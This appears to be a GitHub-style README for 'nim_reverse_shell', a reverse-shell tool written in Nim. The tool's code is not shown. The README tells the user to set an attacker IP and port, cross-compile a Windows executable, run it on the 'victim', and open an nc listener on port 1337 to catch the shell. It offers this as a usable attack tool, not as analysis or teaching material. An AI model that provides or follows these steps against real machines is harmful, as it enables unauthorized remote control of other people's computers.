# nim_reverse_shell

## A simple reverse shell with nim code.

# How to build and run?

### Change this code snippet
```shell
var ip = "10.0.0.183"
var port = 1337
```

### Change this code snippet
```shell
Build the reverse shell:
nim c --d:mingw --cpu=amd64 reverse.nim
On victim:
./reverse.exe
On Attacker:
nc -vnlp 1337
```
